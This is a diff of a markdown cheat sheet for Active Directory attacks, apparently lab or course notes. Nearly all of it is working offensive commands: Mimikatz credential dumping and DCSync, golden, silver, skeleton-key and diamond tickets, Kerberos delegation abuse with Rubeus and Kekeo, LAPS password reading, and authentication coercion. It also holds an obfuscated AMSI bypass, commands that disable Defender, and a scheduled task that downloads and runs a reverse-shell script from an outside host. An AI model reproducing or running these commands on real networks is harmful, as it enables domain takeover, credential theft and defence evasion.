@@ -689,57 +689,45 @@ python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
 
 ##### PowerView
 
-###### Enumerate computers with Unconstrained Delegation
+###### 
 
 ```powershell
+# 1. Enumerate computers with Unconstrained Delegation
 Get-NetComputer -UnConstrained
-```
 
-###### Check if a token is available and save to disk
-
->   **Get admin token** after compromising the computer with UD enabled, we can trick or wait for an admin connection
-
-```powershell
+# 2. Check if a token is available and save to disk
 # After admin connects
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
-```
 
-###### Reuse of the DA token
-
-```powershell
+# 3. Reuse of the DA token
 Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
 ```
 
 ##### Abusing Printer Bug
 
-###### Start Rubeus in monitoring mode
-
 ```powershell
+# 1. Start Rubeus in monitoring mode
 # Capture the TGT
 .\Rubeus.exe monitor /interval:5
 ```
 
-###### MS-RPRN
+###### MS-RPRN or PetitPotam
 
 >   https://github.com/leechristensen/SpoolSample
-
-```powershell
-.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
-```
-
-OR
-
-###### PetitPotam
-
+>
 >   https://github.com/topotam/PetitPotam
 
 ```powershell
+# 2. Coerce an authentication  
+.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
+
+# or
+
 .\PetitPotam.exe us-web us-dc
 ```
 
-###### Capture the TGT run DCSync
-
 ```powershell
+# 3. Capture the TGT run DCSync
 # Copy the base64 encoded TGT, remove extra spaces and use it on the attacker machine
 .\Rubeus.exe ptt /ticket:
 
@@ -755,40 +743,30 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 
 ##### PowerView
 
-###### Enumerate users and computers with CD enabled
-
 ```powershell
+# Enumerate users and computers with CD enabled
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 ```
 
 ##### Kekeo
 
-###### Requesting a TGT
-
 ```powershell
-# Reqyest a TGT for the first hop service account
+# Requesting a TGT for the first hop service account
 tgt::ask /user:appsvc /domain:us.techcorp.local
 /rc4:1D49D390AC01D568F0EE9BE82BB74D4C 
-```
 
-###### Request a TGS
-
-```powershell
+# Request a TGS
 tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/us-mssql.us.techcorp.local 
 ```
 
 ##### Invoke-Mimikatz
 
-###### Inject the ticket
-
 ```powershell
+# Inject the ticket
 Invoke-Mimikatz '"kerberos::ptt  TGS_Administrator@US.TECHCORP.LOCAL_HTTP~us-mssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"' 
-```
 
-###### Execute DCSync
-
-```powershell
+# Execute DCSync
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
@@ -800,29 +778,23 @@ Inoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
 
 ##### Rubeus
 
-###### 1. Request for a `S4U`
-
 ```powershell
-Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt 
-```
+# 1. Request for a S4U`
+Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
 
-###### 2. Remote login using `winrs`
-
-```powershell
+# 2. Remote login using winrs
 winrs -r:us-mssql cmd.exe
 ```
 
 ### Resource-based Constrained Delegation
 
-###### 1. Enumerate if we have Write permissions over any object.
+###### 
 
 ```powershell
+# 1. Enumerate if we have Write permissions over any object.
 Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
-```
 
-###### 2. Using AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
-
-```powershell
+# 2. Using AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
 .\Rubeus.exe s4u /user:student1$ /aes256:d10... /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
 
 winrs -r:us-helpdesk cmd.exe
@@ -830,18 +802,16 @@ winrs -r:us-helpdesk cmd.exe
 
 ### Constrained Delegation with Kerberos Only
 
-###### 1. Assume we have already compromised us-mgmt. We want to configure RBCD on us-mgmt using us-mgmt$ computer account.
+###### 
 
 ```powershell
+# 1. Assume we have already compromised us-mgmt. We want to configure RBCD on us-mgmt using us-mgmt$ computer account.
 # Configure RBCD on us-mgmt using us-mgmt$ computer account.
 C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256Lcc3.. /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap
 
 Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompx$ -Verbose
-```
 
-###### 2. Request a new forwardable TGS/Service Ticket by leveraging the ticket created.
-
-```powershell
+# 2. Request a new forwardable TGS/Service Ticket by leveraging the ticket created.
 C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxj... /user:us-mgmt$ /aes256:cc3... /msdsspn:cifs/us-mssql.us.techcorp.local /alterservice:http /nowrap /ptt
 
 # Access the us-mssql using WinRM as the Domain Admin
@@ -860,26 +830,19 @@ winrs -r:us-mssql.us.techcorp.local cmd.exe
 
 ##### PowerView
 
-###### 1. To find users who can read the passwords in clear text machines in OUs
-
 ```powershell
+# 1. To find users who can read the passwords in clear text machines in OUs
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
-```
 
-###### 2. To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text
-
-```powershell
+# 2. To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text
 # Using Active Directory module
 .\Get-LapsPermissions.ps1
 
 # Using LAPS module (can be copied across machines)
 Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
 Find-AdmPwdExtendedRights -Identity OUDistinguishedName
-```
 
-###### 3. Once we compromise the user which has the Rights, use the following to read clear-text password
-
-```powershell
+# 3. Once we compromise the user which has the Rights, use the following to read clear-text password
 # Powerview
 Get-DomainObject -Identity <targetmachine$> | select - ExpandProperty ms-mcs-admpwd
 
@@ -947,8 +910,6 @@ Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -Ou
 ```
 
 ### Resource Based Constrained Delegation
-
-###### 
 
 ```powershell
 # 1. Enumerate if we have Write permissions over any object
@@ -1049,47 +1010,27 @@ Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
 
 ##### Invoke-Mimikatz
 
-###### Disable Defender [ Important ]
-
 ```powershell
+# Disable Defender [ Important ]
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
-```
 
-###### AMSI bypass [ Important ]
-
-```powershell
+# AMSI bypass [ Important ]
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{O}"-F'F', 'rE' ) ) 3; ( GeT-VariaBle ( "1Q2U" + "zX" )  -VaL_s+)."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{@}{5}" -f'Util', 'A', 'Amsi','.Management.', 'utomation.','s', 'System' ))."g`etf`iE1D"( ( "{O}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{O}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
-```
 
-###### Execute mimikatz on DC as DA to get krbtgt hash
-
-```powershell
+# Execute mimikatz on DC as DA to get krbtgt hash
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
-```
 
-###### Create a ticket on any machine [ "pass the ticket" attack]
-
-```powershell
+# Create a ticket on any machine [ "pass the ticket" attack]
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-```
 
-###### List Kerberos services available
-
-```powershell
+# List Kerberos services available
 klist
-```
 
-###### To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges
-
-```powershell
+# To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-```
-
-```ad-note
-Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC
 ```
 
 ---
@@ -1114,26 +1055,14 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:u
 
 ##### Invoke-Mimikatz
 
-###### Execute mimikatz on DC as DA to get krbtgt hash
-
 ```powershell
+# Execute mimikatz on DC as DA to get krbtgt hash
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
-```
 
-###### Using hash of the Domain Controller computer account, below command provides access to shares on the DC
-
-```powershell
+# Using hash of the Domain Controller computer account, below command provides access to shares on the DC
 Invoke-Mimikatz -Command '"kerberos::golden /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.abc.xyz.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
-```
 
-```ad-note
-Similar command can be used for any other service on a machine.
-Which services? HOST, RPCSS, WSMAN and many more.
-```
-
-###### Schedule and execute a task
-
-```powershell
+# Schedule and execute a task
 schtasks /create /S dcorp-dc.abc.xyz.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"
 
 schtasks /Run /S dcorp-dc.abc.xyz.local /TN "STCheck"
@@ -1143,19 +1072,12 @@ schtasks /Run /S dcorp-dc.abc.xyz.local /TN "STCheck"
 
 ##### Invoke-Mimikatz
 
-###### Use the below command to inject a skeleton-Key
-
 ```powershell
+# Use the below command to inject a skeleton-Key
+# Skeleton Key password is : mimikatz
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.abc.xyz.local
-```
 
-```ad-note
-Skeleton Key password is : **mimikatz**
-```
-
-###### Now we can access any machine with valid username and password as mimikatz
-
-```powershell
+# Now we can access any machine with valid username and password as mimikatz
 Enter-PSSession -Computername dcorp-dc.abc.xyz.local -credential dcorp\Administrator
 ```
 
@@ -1175,15 +1097,11 @@ mimikatz # !-
 
 ##### Rubeus.exe
 
-###### We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too)
-
 ```powershell
+# We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too)
 Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:studentuserx /password:studentuserxpassword /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
 
-###### We could also use /tgtdeleg option in place of credentials in case we have access as a domain user
-
-```powershell
+# We could also use /tgtdeleg option in place of credentials in case we have access as a domain user
 Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
@@ -1337,15 +1255,13 @@ Set-RemotewMI -SamAccountName studentuserl -ComputerName us-dc -Remove
 ###### PowerShell Remoting
 
 ```powershell
-# On local machine for studentuser1:
+# On local machine for studentuser1
 Set-RemotePSRemoting -SamAccountName studentuserl -Verbose
 
-# On remote machine for studentuser1 without credentials:
-
+# On remote machine for studentuser1 without credentials
 Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Verbose
 
-# On remote machine, remove the permissions:
-
+# On remote machine, remove the permissions
 Set-RemotePSRemoting -SamAccountName studentuserl -ComputerName us-dc -Remove
 ```
 
